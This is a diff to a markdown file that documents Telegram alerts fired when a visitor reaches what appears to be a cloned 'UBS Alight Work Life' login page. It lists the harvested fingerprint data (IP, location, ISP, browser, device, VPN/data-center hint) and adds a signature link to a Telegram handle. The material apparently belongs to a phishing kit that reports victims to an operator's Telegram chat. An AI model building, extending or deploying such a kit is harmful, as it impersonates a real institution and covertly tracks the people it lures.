@@ -11,24 +11,27 @@ All notifications are sent to the Telegram chat(s) configured via `TELEGRAM_BOT_
 | **Trigger** | User finishes preloader on homepage (login page) |
 | **API** | `POST /api/telegram/visitor` |
 | **Source** | `app/page.tsx` (after `showContent` is true and visitor info is available) |
-| **Data sent** | Location, IP, Timezone, ISP, User Agent, Screen, Language, Referrer, UTC Time |
+| **Data sent** | Location, IP, Timezone, ISP, Platform, Browser, Device, Screen, Referrer, URL, VPN/Data-Center hint |
 
 **What it looks like in Telegram:**
 
 ```
-🌐 New Visitor - UBS Alight Work Life
+🌐 <b>(Example Site)</b>
+━━━━━━━━━━━━━━━━━━
+📍 <b>Location:</b> <code>New York, US</code>
+🌍 <b>IP:</b> <code>192.168.1.1</code>
+⏰ <b>Timezone:</b> <code>America/New_York</code>
+🌐 <b>ISP:</b> <code>Example ISP</code>
+🛡️ <b>VPN/DATA CENTER:</b> <code>Datacenter / hosting</code>
 
-📍 Location: New York, US
-🌍 IP: 192.168.1.1
-⏰ Timezone: America/New_York
-🌐 ISP: Example ISP
+🖥 <b>Platform:</b> <code>Windows 11</code>
+👨‍💻 <b>Browser:</b> <code>Chrome 128</code>
+📱 <b>Device:</b> <code>Desktop</code>
+🖥️ <b>Screen:</b> <code>1920x1080</code>
+🔗 <b>Referrer:</b> <a href="https://example.com/">https://example.com/</a>
+🌐 <b>URL:</b> <a href="https://example.com/login">https://example.com/login</a>
 
-📱 Device: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
-🖥️ Screen: 1920x1080
-🌍 Language: en-US
-🔗 Referrer: (direct)
-
-🕒 UTC Time: 2025-01-29T18:00:00.000Z
+<a href="https://t.me/th3_allfather">All Father</a>
 ```
 
 ---
